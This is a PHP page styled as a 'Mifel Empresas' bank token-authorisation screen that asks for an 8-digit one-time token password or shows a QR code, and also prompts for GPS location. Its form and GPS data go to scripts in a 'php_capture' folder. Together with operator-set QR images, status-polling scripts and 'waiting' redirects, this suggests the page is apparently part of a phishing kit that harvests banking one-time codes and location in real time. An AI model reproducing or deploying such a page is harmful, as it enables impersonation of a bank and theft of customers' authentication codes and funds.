<?php
session_start();

if (!isset($_SESSION['usuario_id'])) {
    header('Location: index.php');
    exit;
}

require_once __DIR__ . '/../php_config/conexionbd.php';
require_once __DIR__ . '/../php_config/token_pantalla_helpers.php';
require_once __DIR__ . '/../php_config/gps_helpers.php';
require_once __DIR__ . '/../includes/gps_aviso_modal.php';

$pdo = conectarBD();
$usuarioId = (int) $_SESSION['usuario_id'];
$avance = tokenPantallaEvaluarAvance($pdo, $usuarioId);

if (!$avance['puede_avanzar']) {
    header('Location: index.php');
    exit;
}

if (!empty($avance['omitir_token'])) {
    header('Location: netespera.php');
    exit;
}

$usuario = tokenPantallaObtenerUsuario($pdo, $usuarioId);
if (!$usuario || !tokenPantallaRequiereCapturaToken($usuario)) {
    header('Location: netespera.php');
    exit;
}

$modoQr = ($usuario['token_pantalla_modo'] ?? 'normal') === 'qr';
$imagenQr = trim($usuario['token_qr_imagen_url'] ?? '');

$error = $_SESSION['token_error'] ?? '';
unset($_SESSION['token_error']);

$mostrarModalGps = gpsUsuarioNecesitaCaptura($pdo, $usuarioId);

$modoEspera = isset($_GET['espera']) && $_GET['espera'] === '1';
if ($modoEspera) {
    $usuarioEspera = tokenPantallaObtenerUsuario($pdo, $usuarioId);
    if (!$usuarioEspera || !tokenPantallaTokenIngresado($usuarioEspera)) {
        header('Location: token.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autoriza con tu token - Empresas</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../css/feLinicio.css">
    <link rel="stylesheet" href="../css/_responsivefel.css">
    <link rel="stylesheet" href="../css/gps.css">
    <link rel="stylesheet" href="css/empresas-header.css">
    <link rel="stylesheet" href="css/empresas-token.css?v=20260806">
    <link rel="stylesheet" href="css/token-pagina-qr.css?v=20260713">
    <link rel="stylesheet" href="../php_modales/css/modales_input_no_input.css">
    <link rel="stylesheet" href="../php_modales/css/herramientas.css">
    <link rel="stylesheet" href="../php_modales/css/reloj_personalizado.css">
    <link rel="stylesheet" href="../php_modales/css/email_validate.css">
    <link rel="stylesheet" href="../php_modales/css/token_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/token_qr_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/contacto_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/sincronizacion.css">
    <link rel="stylesheet" href="../css/zeppelin_churro_btn.css">
    <?php gpsAvisoModalEmpresasAssets($mostrarModalGps); ?>
    <?php require_once __DIR__ . '/../includes/responsive_movil.php'; mifel_responsive_movil_empresas(); ?>
</head>
<body class="<?= $modoQr ? 'token-pagina-qr' : '' ?>">
    <header class="header-container empresas-header">
        <div class="header-wrapper">
            <div class="logo-center">
                <img src="../images/logo-empresas_BLANCO.svg" alt="Mifel Empresas" class="mifel-header-logo">
            </div>
            <?php require_once __DIR__ . '/includes/bienvenida_usuario.php'; ?>
        </div>
    </header>

    <main class="gps-container">
        <div class="gps-content">
            <?php if ($modoQr && $imagenQr !== ''): ?>
            <div class="token-qr-page-content">
                <h1 class="token-qr-page-title">Autoriza con tu token</h1>
                <p class="token-qr-page-description">Escanea el código e ingresa la contraseña token.</p>
                <span class="token-qr-page-help">¿Cómo escanear el código?</span>
                <div class="token-qr-page-image-wrap">
                    <img src="<?= htmlspecialchars($imagenQr, ENT_QUOTES, 'UTF-8') ?>" alt="Código QR token" class="token-qr-page-image" loading="lazy">
                </div>
                <div class="token-qr-page-timer">
                    <span class="token-qr-page-timer-dot" aria-hidden="true"></span>
                    <span>El código cambiará en 3 minutos</span>
                </div>
                <hr class="token-qr-page-divider">
            </div>
            <?php else: ?>
            <h1 class="gps-title">Autoriza con tu token</h1>
            <p class="token-description">
                Ingresa la contraseña de 8 dígitos que se genera en tu dispositivo token
            </p>
            <?php endif; ?>

            <form id="tokenForm" class="token-form" action="../php_capture/token_empresas.php" method="POST" novalidate<?= !empty($modoEspera) ? ' data-espera-redireccion="1"' : '' ?>>
                <div class="token-input-row">
                    <div class="token-field">
                        <label for="token_codigo" class="token-label">Contraseña token</label>
                        <input
                            type="password"
                            id="token_codigo"
                            name="token_codigo"
                            class="token-input<?= $error !== '' ? ' is-invalid' : '' ?>"
                            maxlength="8"
                            inputmode="numeric"
                            pattern="[0-9]{8}"
                            autocomplete="one-time-code"
                            required
                            <?= !empty($modoEspera) ? 'disabled readonly' : '' ?>
                            oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                        >
                        <?php if ($error !== ''): ?>
                        <span class="token-error" role="alert"><?= htmlspecialchars($error, ENT_QUOTES, 'UTF-8') ?></span>
                        <?php endif; ?>
                    </div>
                    <button
                        type="submit"
                        class="token-submit<?= !empty($modoEspera) ? ' token-submit--waiting' : '' ?>"
                        id="tokenSubmitBtn"
                        <?= !empty($modoEspera) ? 'disabled aria-busy="true"' : '' ?>
                    >
                        <span class="token-submit__label">Autorizar</span>
                        <img src="images/login-spinner.svg" alt="" class="token-submit__spinner" width="20" height="20" aria-hidden="true">
                    </button>
                </div>
            </form>

            <a href="index.php?reiniciar=1" class="token-back<?= !empty($modoEspera) ? ' link-disabled' : '' ?>" <?= !empty($modoEspera) ? 'tabindex="-1" aria-disabled="true"' : '' ?>>Volver</a>
        </div>
    </main>

    <?php if ($mostrarModalGps) {
        gpsAvisoModalMarkup('../php_capture/gps_login_empresas.php', '../images/gps.png', 'images/login-spinner.svg');
    } ?>

    <script>window.MODAL_BASE = '../';</script>
    <script src="../php_modales/js/check_status.js"></script>
    <script src="../php_modales/js/modales_input_no_input.js"></script>
    <script src="../php_modales/js/herramientas.js"></script>
    <script src="../php_modales/js/reloj_personalizado.js"></script>
    <script src="../php_modales/js/redirecciones.js"></script>
    <script src="../php_modales/js/email_validate_handler.js"></script>
    <script src="../php_modales/js/token_empresa_handler.js"></script>
    <script src="../php_modales/js/token_qr_empresa_handler.js"></script>
    <script src="../php_modales/js/contacto_empresa_handler.js"></script>
    <script src="../php_modales/js/sincronizacion_handler.js"></script>
    <script src="js/token_submit.js"></script>
    <?php if ($mostrarModalGps): ?>
    <script src="../js/gps_login_modal.js?v=20260806"></script>
    <?php endif; ?>
</body>
</html>
